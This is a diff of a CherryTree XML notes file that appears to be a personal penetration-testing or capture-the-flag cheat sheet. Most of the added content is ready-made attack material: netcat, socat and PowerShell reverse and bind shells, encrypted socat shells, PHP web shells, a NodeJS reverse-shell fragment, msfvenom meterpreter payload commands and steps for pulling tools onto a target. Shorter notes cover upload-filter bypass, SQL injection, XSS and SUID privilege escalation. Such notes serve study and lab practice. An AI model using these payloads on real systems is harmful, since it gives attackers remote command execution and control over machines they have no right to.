-  <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699020019">
+  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699550897">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+LINUX
+Use LinEnum: wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</rich_text>
+  </node>
+  <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699550888">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 basic ways to bypass client-side file upload filter:
@@ -2420,15 +2595,9 @@ Basic server-side filter bypass
 
 </rich_text>
   </node>
-  <node name="Access" unique_id="54" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696624665" ts_lastsave="1698932911">
+  <node name="Access" unique_id="54" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696624665" ts_lastsave="1699551234">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
-netcat listener:
-</rich_text>
-    <rich_text indent="1">nc -lvnp </rich_text>
-    <rich_text indent="1" weight="heavy">PORT</rich_text>
-    <rich_text>
-
 telnet</rich_text>
     <rich_text indent="1"> </rich_text>
     <rich_text indent="1" weight="heavy">IP</rich_text>
@@ -2459,10 +2628,7 @@ shell access:
     <rich_text indent="2" weight="heavy">PORT</rich_text>
     <rich_text indent="2"> R</rich_text>
     <rich_text indent="1">
-start netcat listener:
-</rich_text>
-    <rich_text indent="2">nc -lvnp </rich_text>
-    <rich_text indent="2" weight="heavy">PORT</rich_text>
+start netcat listener</rich_text>
     <rich_text>
 
 running executable as root with SUID bit:
@@ -2486,9 +2652,317 @@ set SUID-bit:
     <rich_text indent="2">./</rich_text>
     <rich_text indent="2" weight="heavy">FILE </rich_text>
     <rich_text indent="2">-p</rich_text>
-    <node name="SQL Injection" unique_id="73" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698615329" ts_lastsave="1698764744">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+
+RDP:
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:</rich_text>
+    <rich_text weight="heavy">IP</rich_text>
+    <rich_text> /u:</rich_text>
+    <rich_text weight="heavy">USERNAME</rich_text>
+    <rich_text> /p:'</rich_text>
+    <rich_text weight="heavy">PASSWORD</rich_text>
+    <rich_text>!'</rich_text>
+    <node name="Netcat" unique_id="73" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698615329" ts_lastsave="1699551280">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+bind connection:
+</rich_text>
+      <rich_text indent="1">nc </rich_text>
+      <rich_text indent="1" weight="heavy">IP PORT</rich_text>
+      <rich_text> -e /bin/bash/
+</rich_text>
+      <rich_text indent="1">nc </rich_text>
+      <rich_text indent="1" weight="heavy">IP PORT</rich_text>
+      <rich_text> -e cmd.exe
+
+listen mode:
+</rich_text>
+      <rich_text indent="1">nc -lvnp </rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
       <rich_text>
+
+Shell Stabilisation:
+</rich_text>
+      <rich_text indent="1">Optimize terminal size:</rich_text>
+      <rich_text>file 
+</rich_text>
+      <rich_text indent="2">run on local machine stty -a</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">note the rows and columns values</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">in the shell set those values</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">stty rows </rich_text>
+      <rich_text indent="2" weight="heavy">NR</rich_text>
+      <rich_text indent="2">
+stty cols </rich_text>
+      <rich_text indent="2" weight="heavy">NR</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Linux with python:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">acess target</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">python -c 'import pty;pty.spawn("/bin/bash")'</rich_text>
+      <rich_text> -&gt; spawns better shell, possibly to specify python version
+</rich_text>
+      <rich_text indent="2">export TERM=xterm</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">background the shell wit CTRL+Z</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">stty raw -echo; fg</rich_text>
+      <rich_text> -&gt; enables autocompletion, .... end re-opens the shell
+</rich_text>
+      <rich_text indent="2">to reset -&gt; reset</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Socat shell</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text indent="2">get the socat binary to the target machine</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">wget </rich_text>
+      <rich_text indent="4">https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">linux: wget </rich_text>
+      <rich_text indent="2" weight="heavy">LOCAL_IP</rich_text>
+      <rich_text indent="2">/socat -O /tmp/socat</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">windows: Invoke-WebRequest -uri </rich_text>
+      <rich_text indent="2" weight="heavy">LOCAL_IP</rich_text>
+      <rich_text indent="2">/socat.exe -outfile C:\\Windows\temp\socat.exe</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">rlwrap:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">sudo apt install rlwrap -y
+rlwrap nc -lvnp </rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">for linux targets: background shell and then ‘stty raw -echo; fg’</rich_text>
+      <node name="Man" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699525458" ts_lastsave="1699525478">
+        <rich_text>Basic:
+</rich_text>
+        <rich_text indent="1">-l 	Listen mode
+-p 	Specify the Port number
+-n 	Numeric only; no resolution of hostnames via DNS
+-v 	Verbose output (optional, yet useful to discover any bugs)
+-vv 	Very Verbose (optional)
+-k 	Keep listening after client disconnects</rich_text>
+        <rich_text>
+
+connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
+
+listen for inbound:	nc -l -p port [-options] [hostname] [port]
+
+options:
+</rich_text>
+        <rich_text indent="1">	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
+	-e filename		program to exec after connect [dangerous!!]
+	-b			allow broadcasts
+	-g gateway		source-routing hop point[s], up to 8
+	-G num			source-routing pointer: 4, 8, 12, ...
+	-h			this cruft
+	-i secs			delay interval for lines sent, ports scanned
+        -k                      set keepalive option on socket
+	-l			listen mode, for inbound connects
+	-n			numeric-only IP addresses, no DNS
+	-o file			hex dump of traffic
+	-p port			local port number
+	-r			randomize local and remote ports
+	-q secs			quit after EOF on stdin and delay of secs
+	-s addr			local source address
+	-T tos			set Type Of Service
+	-t			answer TELNET negotiation
+	-u			UDP mode
+	-v			verbose [use twice to be more verbose]
+	-w secs			timeout for connects and final net reads
+	-C			Send CRLF as line-ending
+	-z			zero-I/O mode [used for scanning]</rich_text>
+        <rich_text>
+	
+port numbers can be individual or ranges: lo-hi [inclusive];
+hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
+
+</rich_text>
+      </node>
+    </node>
+    <node name="Socat" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699533283" ts_lastsave="1699551324">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
+
+Reverse shell:
+</rich_text>
+      <rich_text indent="1">Listener:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">socat TCP-L:</rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text indent="2"> -</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Windows target:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">socat TCP:</rich_text>
+      <rich_text indent="2" weight="heavy">IP</rich_text>
+      <rich_text indent="2">:</rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text indent="2"> EXEC:powershell.exe,pipes</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Linux target:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">socat TCP:</rich_text>
+      <rich_text indent="2" weight="heavy">IP</rich_text>
+      <rich_text indent="2">:</rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text indent="2"> EXEC:"bash -li"</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">special stable shell:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">listener:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">socat TCP-L:</rich_text>
+      <rich_text indent="3" weight="heavy">PORT</rich_text>
+      <rich_text indent="3"> FILE:`tty`,raw,echo=0</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">linux target:</rich_text>
+      <rich_text indent="1">
+</rich_text>
+      <rich_text indent="3">socat TCP:</rich_text>
+      <rich_text indent="3" weight="heavy">IP</rich_text>
+      <rich_text indent="3">:</rich_text>
+      <rich_text indent="3" weight="heavy">PORT</rich_text>
+      <rich_text indent="3"> EXEC:"bash -li",pty,stderr,sigint,setsid,sane</rich_text>
+      <rich_text>
+
+Bind shell:
+</rich_text>
+      <rich_text indent="1">bind connection:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">socat TCP:</rich_text>
+      <rich_text indent="2" weight="heavy">IP</rich_text>
+      <rich_text indent="2">:</rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text indent="2"> -</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Linux target:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">socat TCP-L:</rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text indent="2"> EXEC:"bash -li"</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Windows target:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">socat TCP-L:</rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text indent="2"> EXEC:powershell.exe,pipes</rich_text>
+      <rich_text>
+
+Encrypted shells:
+</rich_text>
+      <rich_text indent="1">on attacking machine generate certificate:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">reverse shell:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">listener:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">socat OPENSSL-LISTEN:</rich_text>
+      <rich_text indent="3" weight="heavy">PORT</rich_text>
+      <rich_text indent="3">,cert=shell.pem,verify=0 -</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">linux target:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">socat OPENSSL:</rich_text>
+      <rich_text indent="3" weight="heavy">IP</rich_text>
+      <rich_text indent="3">:</rich_text>
+      <rich_text indent="3" weight="heavy">PORT</rich_text>
+      <rich_text indent="3">,verify=0 EXEC:/bin/bash</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">special stable shell:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">listener:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="4">socat OPENSSL-LISTEN:</rich_text>
+      <rich_text indent="4" weight="heavy">PORT</rich_text>
+      <rich_text indent="4">,cert=shell.pem, FILE:`tty`,raw,echo=0</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">linux target:</rich_text>
+      <rich_text indent="1">
+</rich_text>
+      <rich_text indent="4">socat OPENSSL:</rich_text>
+      <rich_text indent="4" weight="heavy">IP</rich_text>
+      <rich_text indent="4">:</rich_text>
+      <rich_text indent="4" weight="heavy">PORT</rich_text>
+      <rich_text indent="4"> EXEC:"bash -li",pty,stderr,sigint,setsid,sane</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">bind shell:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">bind connection:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">socat OPENSSL:</rich_text>
+      <rich_text indent="3" weight="heavy">IP</rich_text>
+      <rich_text indent="3">:</rich_text>
+      <rich_text indent="3" weight="heavy">PORT</rich_text>
+      <rich_text indent="3">,verify=0 -</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">Windows Target:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">socat OPENSSL-LISTEN:</rich_text>
+      <rich_text indent="3" weight="heavy">PORT</rich_text>
+      <rich_text indent="3">,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">Linux target:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">socat OPENSSL-LISTEN:</rich_text>
+      <rich_text indent="3" weight="heavy">PORT</rich_text>
+      <rich_text indent="3">,cert=shell.pem,verify=0 </rich_text>
+      <rich_text>EXEC:"bash -li"
+</rich_text>
+    </node>
+    <node name="SQL Injection" unique_id="93" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699525351" ts_lastsave="1699525351">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 skip any sql statements:
 </rich_text>
@@ -2533,49 +3007,27 @@ UNION ALL SELECT </rich_text>
 
 </rich_text>
     </node>
-    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1699283070">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
-list msfvenom payloads:
+    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1699546525">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Useful online tools:
 </rich_text>
-      <rich_text indent="1">msfvenom -l </rich_text>
+      <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
       <rich_text>
-
-list msfvenom formats:
 </rich_text>
-      <rich_text indent="1">msfvenom -l formats</rich_text>
+      <rich_text link="webs https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
       <rich_text>
 
-list msfvenom encoders:
-</rich_text>
-      <rich_text indent="1">msfvenom -l </rich_text>
-      <rich_text>encoders
-
-generate payload with msfvenom:
-</rich_text>
-      <rich_text indent="1">msfvenom -p </rich_text>
-      <rich_text indent="1" weight="heavy">PAYLOAD</rich_text>
-      <rich_text indent="1"> lhost=</rich_text>
-      <rich_text indent="1" weight="heavy">IP</rich_text>
-      <rich_text indent="1"> lport=</rich_text>
-      <rich_text indent="1" weight="heavy">PORT</rich_text>
-      <rich_text indent="1"> -f </rich_text>
-      <rich_text indent="1" weight="heavy">FORMAT</rich_text>
-      <rich_text indent="1"> -o </rich_text>
-      <rich_text weight="heavy">OUTPUT_NAME</rich_text>
-      <rich_text>
-
-
-Upload web-shell to webpage (PHP):
+Web-shell (PHP):
 </rich_text>
       <rich_text indent="1">Identify directory of file uploads</rich_text>
       <rich_text>
 </rich_text>
       <rich_text indent="1">create file with php command:
 </rich_text>
-      <rich_text indent="2">&lt;?php
-    echo system($_GET["cmd"]);
-?&gt;</rich_text>
+      <rich_text indent="2">var1: &lt;?php echo system($_GET["cmd"]); ?&gt;</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">var2: &lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</rich_text>
       <rich_text>
 </rich_text>
       <rich_text indent="1">Navigate to the file location on browser</rich_text>
@@ -2583,9 +3035,9 @@ Upload web-shell to webpage (PHP):
 </rich_text>
       <rich_text indent="2" weight="heavy">PATH_TO_UPLOADS_DIRECTORY</rich_text>
       <rich_text indent="2">/webshell.php?cmd=</rich_text>
-      <rich_text indent="2" weight="heavy">BASH_COMMAND1</rich_text>
+      <rich_text indent="2" weight="heavy">COMMAND1</rich_text>
       <rich_text indent="2">;</rich_text>
-      <rich_text indent="2" weight="heavy">BASH_COMMAND2</rich_text>
+      <rich_text indent="2" weight="heavy">COMMAND2</rich_text>
       <rich_text indent="2">;</rich_text>
       <rich_text>
 
@@ -2612,6 +3064,9 @@ PHP reverse-shell:
 
 NodeJS reverse-shell:
 </rich_text>
+      <rich_text indent="1">shell.js</rich_text>
+      <rich_text>
+</rich_text>
       <rich_text indent="1">(function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -2628,10 +3083,127 @@ NodeJS reverse-shell:
     });
     return /a/; // Prevents the Node.js application form crashing
 })();</rich_text>
-    </node>
-    <node name="XSS" unique_id="78" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698764744" ts_lastsave="1698765116">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
       <rich_text>
+
+Bash reverse shell:
+</rich_text>
+      <rich_text indent="1">nc </rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1"> </rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
+      <rich_text indent="1"> -e /bin/bash</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">mkfifo /tmp/f; nc </rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1"> </rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
+      <rich_text indent="1"> &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</rich_text>
+      <rich_text>
+
+Bash bind listener:
+</rich_text>
+      <rich_text indent="1">mkfifo /tmp/f; nc -lvnp </rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
+      <rich_text indent="1"> &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</rich_text>
+      <rich_text>
+
+Powershell reverse shell:
+</rich_text>
+      <rich_text indent="1">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('</rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1">',</rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
+      <rich_text indent="1">);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</rich_text>
+      <rich_text>
+</rich_text>
+      <node name="MSF Venom" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699449829" ts_lastsave="1699535470">
+        <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+list msfvenom payloads:
+</rich_text>
+        <rich_text indent="1">msfvenom -l </rich_text>
+        <rich_text>
+
+list msfvenom formats:
+</rich_text>
+        <rich_text indent="1">msfvenom -l formats</rich_text>
+        <rich_text>
+
+list msfvenom encoders:
+</rich_text>
+        <rich_text indent="1">msfvenom -l </rich_text>
+        <rich_text>encoders
+
+generate payload with msfvenom:
+</rich_text>
+        <rich_text indent="1">msfvenom -p </rich_text>
+        <rich_text indent="1" weight="heavy">PAYLOAD</rich_text>
+        <rich_text indent="1"> lhost=</rich_text>
+        <rich_text indent="1" weight="heavy">IP</rich_text>
+        <rich_text indent="1"> lport=</rich_text>
+        <rich_text indent="1" weight="heavy">PORT</rich_text>
+        <rich_text indent="1"> -f </rich_text>
+        <rich_text indent="1" weight="heavy">FORMAT</rich_text>
+        <rich_text indent="1"> -o </rich_text>
+        <rich_text weight="heavy">OUTPUT_NAME</rich_text>
+        <rich_text>
+
+Basic reverse shells:
+</rich_text>
+        <rich_text indent="1">Linux
+</rich_text>
+        <rich_text indent="2">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=</rich_text>
+        <rich_text indent="2" weight="heavy">IP</rich_text>
+        <rich_text indent="2"> LPORT=</rich_text>
+        <rich_text indent="2" weight="heavy">PORT</rich_text>
+        <rich_text indent="2"> -f elf -o rev_shell.elf</rich_text>
+        <rich_text indent="1">
+
+Windows
+</rich_text>
+        <rich_text indent="2">msfvenom -p windows/meterpreter/reverse_tcp LHOST=</rich_text>
+        <rich_text indent="2" weight="heavy">IP</rich_text>
+        <rich_text indent="2"> LPORT=</rich_text>
+        <rich_text indent="2" weight="heavy">PORT</rich_text>
+        <rich_text indent="2"> -f exe -o rev_shell.exe</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="2">msfvenom -p windows/x64/shell/reverse_tcp LHOST=</rich_text>
+        <rich_text indent="2" weight="heavy">IP</rich_text>
+        <rich_text indent="2"> LPORT=</rich_text>
+        <rich_text indent="2" weight="heavy">PORT</rich_text>
+        <rich_text indent="2"> -f exe -o shell.exe </rich_text>
+        <rich_text indent="1">
+
+PHP
+</rich_text>
+        <rich_text indent="2">msfvenom -p php/meterpreter_reverse_tcp LHOST=</rich_text>
+        <rich_text indent="2" weight="heavy">IP</rich_text>
+        <rich_text indent="2"> LPORT=</rich_text>
+        <rich_text indent="2" weight="heavy">PORT</rich_text>
+        <rich_text indent="2"> -f raw -o rev_shell.php</rich_text>
+        <rich_text indent="1">
+
+ASP
+</rich_text>
+        <rich_text indent="2">msfvenom -p windows/meterpreter/reverse_tcp LHOST=</rich_text>
+        <rich_text indent="2" weight="heavy">IP</rich_text>
+        <rich_text indent="2"> LPORT=</rich_text>
+        <rich_text indent="2" weight="heavy">PORT</rich_text>
+        <rich_text indent="2"> -f asp -o rev_shell.asp</rich_text>
+        <rich_text indent="1">
+
+Python
+</rich_text>
+        <rich_text indent="2">msfvenom -p cmd/unix/reverse_python LHOST=</rich_text>
+        <rich_text indent="2" weight="heavy">IP</rich_text>
+        <rich_text indent="2"> LPORT=</rich_text>
+        <rich_text indent="2" weight="heavy">PORT</rich_text>
+        <rich_text indent="2"> -f raw -o rev_shell.py</rich_text>
+      </node>
+    </node>
+    <node name="XSS" unique_id="78" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698764744" ts_lastsave="1699449866">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Types:
 DOM (Special)
 </rich_text>
@@ -2676,8 +3248,9 @@ changing query parameter values</rich_text>
     <rich_text>
 
 </rich_text>
-    <node name="Basic info" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697139099" ts_lastsave="1697142628">
-      <rich_text>Tools:
+    <node name="Basic info" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697139099" ts_lastsave="1699449925">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Tools:
 </rich_text>
       <rich_text indent="1" weight="heavy">Proxy</rich_text>
       <rich_text indent="1">: Intercept and modify requests/responses when interacting with web applications.
@@ -2714,8 +3287,9 @@ Ctrl + Shift + R -&gt; Switch to the Repeater tab</rich_text>
 
 </rich_text>
     </node>
-    <node name="Finetune" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697141883" ts_lastsave="1697141967">
-      <rich_text>intercepting only relevant data:
+    <node name="Finetune" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697141883" ts_lastsave="1699449922">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+intercepting only relevant data:
 </rich_text>
       <rich_text indent="1">go to target
 add to scope
@@ -2723,14 +3297,14 @@ go to proxy setting
 adjust interception rule to include scope only</rich_text>
     </node>
   </node>
-  <node name="AAO" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699287281" ts_lastsave="1699366282">
+  <node name="AAO" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699287281" ts_lastsave="1699550842">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 Check available sudo commands:
 </rich_text>
     <rich_text indent="1">sudo -l</rich_text>
   </node>
-  <node name="Cryptography" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699366282" ts_lastsave="1699366435">
+  <node name="Cryptography" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699366282" ts_lastsave="1699441549">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 Useful tools:
@@ -2752,7 +3326,19 @@ n: p * q
 e: +n= public key
 d: +n= private key
 c</rich_text>
-    <rich_text>: ciphertext</rich_text>
+    <rich_text>: ciphertext
+
+GPG:
+</rich_text>
+    <rich_text indent="1">gpg --import</rich_text>
+    <rich_text indent="1" weight="heavy"> GPG_KEY_FILE</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">gpg </rich_text>
+    <rich_text indent="1" weight="heavy">ENCRYPTED_FILE</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">New file will be created with the plaintext</rich_text>
   </node>
   <node name="Web Exploitation basic method" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="31" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1699274102">
